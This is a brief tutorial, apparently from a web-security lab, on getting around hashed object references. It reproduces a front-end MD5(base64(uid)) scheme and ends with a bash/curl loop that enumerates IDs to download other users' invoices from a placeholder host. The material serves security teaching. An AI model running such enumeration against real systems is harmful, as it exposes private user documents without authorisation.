# Bypassing Encoded References
***
#### Nowadays, it is commonly seen encoded direct references , using MD5 or other encoding methods.
#### For example: `invoice=6d1e26ed85e7203cf992b7198c46cb6b`

#### In some cases whe can try to hash various values, such as `uid`, `username`, `fn`, and then check if we find any MD5 hash match.
```bash
$ echo -n 1337 | md5sum
```
#### Another way to perform the check above is to use the `Burp Comparer` to fuzz various values and compare each to our hash to see if there is any match.
#### Nonetheless, this is considered a `Secure Direct Object Reference` as it would be really hard to predict when there are a lot of values combined before hashing. However ,in some web applications it's still possible to abuse this feature.

### Function Disclosure
#### One of the most critical flaws that we can encounter on a website is when developers perform sensitive functions on the front-end, exposing them to the attackers. For instance, we could study the hash function , if the hash was being calculated  on the front-end, and then replicate its functionality to generate our hashes and then fuzz the parameters.

#### Example of a sensitive function that performs the hash using MD5 (collision prone)
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
#### The function above sends a **POST** request with the contract param, with its value being hashed (MD5) using the **CryptoJS** library. The method `btoa(uid)`, performs the **base64** encode of the uid input value before passing though the hash method.

#### Example of the function above through bash
```bash
$ echo -n 1337 | base64 -w 0 | md5sum
```

#### **NOTE:** The `-n` and the `-w 0` flags are being used to avoid adding newlines to properly calculate the **md5** hash.

### Mass Enumeration
#### To perform a mass enumeration we can write a simple bash script , or in some more specific cases we may utilize tools like **Burp Intruder** or **ZAP Fuzzer**.
#### First we need to calculate the hash for each id:
```bash
$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

#### Finally, we make  a post request for each calculated hash to download the users' invoices
```
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<IP>:<PORT>/download.php
    done
done
```
